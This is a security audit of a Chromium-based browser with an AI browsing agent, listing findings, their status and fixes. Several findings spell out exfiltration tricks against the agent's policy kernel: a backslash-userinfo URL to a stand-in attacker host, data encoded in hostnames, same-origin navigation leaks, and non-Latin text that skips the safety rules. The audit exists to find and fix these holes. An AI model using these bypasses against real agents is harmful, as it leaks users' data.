# Production readiness audit — 25 September 2026

Scope: the 819 files Zephyrus changes on top of Chromium, the `out/Release`
configuration, and a 3-minute net-log of a fresh profile on the Release binary.
Inherited Chromium mechanisms were checked for regressions, not re-audited.
Full write-up (private artifact): https://claude.ai/artifact/5vux3x6uBrzWJk2NBY2JXt

**Release status: NOT READY — blockers remain** (Z-01, Z-02, Z-03, Z-05).

| ID | Sev | Status | Finding |
|---|---|---|---|
| Z-01 | P0 | open | Base 151.0.7922.171 is out of support. Stable was 155.0.8059.12; 5 later M151 releases and 30 across M152–M155 are missing. |
| Z-02 | P0 | open | No browser auto-updater. Only the filter lists update; fixes cannot reach installed users. |
| Z-03 | P1 | open | Binaries and installer unsigned (no signing step in `package_installer.py`). |
| Z-04 | P1 | **fixed** | Any third-party filter list could use uBO `trusted-*` scriptlets (response rewrite, cookies, clicks) on any named site. Now only uAssets sections and built-in rules may. |
| Z-05 | P1 | open (probable) | Safe Browsing inactive: no Google API key; zero `safebrowsing.googleapis.com` requests in 3 min. |
| Z-06 | P3 | **fixed** (2026-10-24) | Installer unpacked to predictable `%TEMP%\zephyrus_setup_<pid>`, ignored a pre-existing dir, wrote then executed by path. Now a GUID-named folder it must create itself, `CREATE_NEW` files. Not compiled in this pass: Windows-only. |
| Z-07 | P3 | open | Inter forced for every web generic font family: trivially fingerprints Zephyrus. |
| Z-08 | P3 | open | Fingerprint seed not delivered to dedicated/shared workers. |
| Z-09 | P3 | **fixed** | Dead `OpenPrivateTabIn` path put OTR tabs in a regular window. Deleted. |
| Z-10 | P4 | **fixed** | Dev switches shipped in release. Now compiled only with `zephyrus_dev_switches` (GN arg, default off in official builds); packager refuses a build with them unless `--allow-dev-switches`. |
| Z-11 | P4 | open | Filter-list fetch triggers a NEL report to `a.nel.cloudflare.com`. |
| Z-12 | P4 | open | Fork commit message names 151.0.7913.0; real base is 151.0.7922.171. |

## Verified not vulnerable

- Renderer→browser Mojo (`PrivacyReporter`, `FingerprintSeedHost`,
  `ScriptletHost`): origin from the RenderFrameHost, inputs bounded,
  `DocumentService` lifetime, reports deduplicated per site/surface.
- No sandbox or site-isolation changes; agent kernel is `kService`-sandboxed.
- Ad-block URL-loader proxy decides at request start, never reads bodies.
- Agent model/vision endpoints are loopback-only (`net::IsLocalhost`).
- Entity dataset: Ed25519 verified before parse; unsigned path `CHECK_IS_TEST`.
- `chrome://privacy` pages escape every runtime string.
- Private Workspace: primary OTR profile in its own `Browser`.
- No telemetry: a fresh install contacts only the filter-list hosts and
  Chromium's component updater; `X-Client-Data` removed; no variations fetch.

## Not present

VPN, UPI, DigiLocker, AI autofill, native messaging host: none exist in the
codebase. Each needs its own threat model before it is built.

## Unverified

Runtime process integrity levels; fuzzing/sanitizer runs; 100-tab and 12-hour
soak; screen-reader and high-contrast passes; multi-monitor/mixed DPI;
macOS/Linux.

## Follow-up pass — 24 October 2026

Scope: the Rust agent kernel, the demo proxy, the agent's network paths and the
installer runner. Method: read as an attacker, write the failing test first, fix,
then replay every URL and element in the benchmark corpus through the old and the
new kernel (25,038 navigation decisions and 452 click/type decisions: the only
difference is the `file://` denial below).

| ID | Sev | Status | Finding |
|---|---|---|---|
| Z-13 | P2 | **fixed** | The kernel and Chromium read a URL differently. `https://attacker.example\@www.google.com/search?q=<data>` is a request to attacker.example (WHATWG: `\` ends the authority), but the kernel read userinfo + `www.google.com`, which is on the search-engine allowance, so the exfiltration rule waved it through. A tab/newline/NUL/`%` in the authority had the same effect. `origin_of` now ends the authority at `\` and declines (asks) on anything the browser's parser would treat differently. |
| Z-14 | P3 | **fixed** | The kernel said Allow to `file://localhost/...`, `chrome://settings/passwords` and `javascript://x/...` (the executor refused them afterwards, but the kernel's answer is the audited one). Any non-http(s) scheme is now Deny. `tabs.open` with an empty url or `about:newtab` is a blank tab, as the executor already treats it. |
| Z-15 | P3 | **fixed** | Data in the hostname (`<base64>.attacker.example`) was not data to the policy, including behind a search-shaped query. A label over 32 bytes or a host over 64 now counts as carrying data. An IP address's last-but-one octet no longer matches a number in the task ("3 laptops" vs `10.0.3.4`). |
| Z-16 | P2 | **fixed** | The five requests that carry page content, screenshots, audio or an API key (`model_transport`, `voice_input`, `local_vision_client`, two in `dev_model_client`) followed redirects. The key rides in `x-api-key`/`x-goog-api-key`, which Chromium does not strip on a cross-origin redirect. `redirect_mode = kError`. Unit assertion added; C++ not built in this pass. |
| Z-17 | P2 | **fixed** | Demo proxy: (a) the rate-limit identity was the first `X-Forwarded-For` entry, which the client chooses, so there was no effective limit; (b) `tools` was forwarded unchecked, so a token could enable Anthropic's billed server tools (web search, code execution, web fetch); (c) the limiter table was cleared outright at 5,000 keys, resetting everyone; (d) a provider dying mid-reply escaped as an unhandled rejection; (e) upstream redirects were followed with the key. Fixed, with tests, and a real kernel-built request is shown to pass the new rule. |
| Z-18 | P3 | **fixed** | A valid tool call whose argument held an unbalanced brace (`{"text":"if (x) {"}`) was reported as "no tool call found": the extractor counted braces without knowing about strings. Now read with serde, bounded to 256 starts. |
| Z-19 | P3 | **fixed** | The "asks before anything that costs money" list missed `Make payment`, `Proceed to payment`, `Place bid`, `Recharge`, `Add money`, `Top up`, `Renew`, `Upgrade`, `Withdraw` and the common Hindi equivalents. Added as phrases so `Payments` / `Payment methods` stay quiet. Word boundaries are now script-aware. |
| Z-20 | P4 | **fixed** | The installer left the whole unpacked payload (hundreds of MB) in `%TEMP%` after any failed install. Removed on every exit path. |
| Z-21 | P5 | **fixed** | The out-of-credit message shown to users had two 17-space gaps (a lost line continuation). `.gitignore` did not cover the generated `bundled_keys_data.h`, the keys JSON, `.env*`, `.vercel` or Python bytecode. |

### Found and deliberately not changed

- **Same-origin navigation is "expected".** On a page the attacker controls, `navigate https://<that page's origin>/?d=<data seen earlier>` is allowed because the origin matches the current page. Tightening it makes ordinary on-site filtering ask. A product decision, not a patch.
- **Non-Latin scripts.** The wrong-recipient rule (`ambiguous_choice`) and the "did the task ask for this" rule tokenise ASCII only, so a Devanagari task skips them. Measured: "Send the report to Alex" asks; the same sentence in Devanagari does not. Hindi payment buttons are now covered (Z-19); outbound and destructive verbs are not.
- **Field labels.** `OTP`, `Aadhaar`, `PAN`, `UPI` fields are not in the sensitivity label hints.
- **Ad-block `||host^` rules** do not match a URL with userinfo (`https://x@ads.example/`). Chromium already blocks credentialed subresources, so this affects documents and frames only.
- `demo_proxy/scripts/mint_token.js` takes the secret as an argument (visible in the local process list while it runs).

### Not exercised in this pass

Anything that needs a Chromium build: all C++ changes (`model_transport`, `voice_input`, `local_vision_client`, `dev_model_client`, the installer) are reviewed but uncompiled. The benchmark's loop-driven tests need `zephyrus_loop_probe`, a C++ binary; only the extraction tests were run, against a Rust build of the same kernel code.
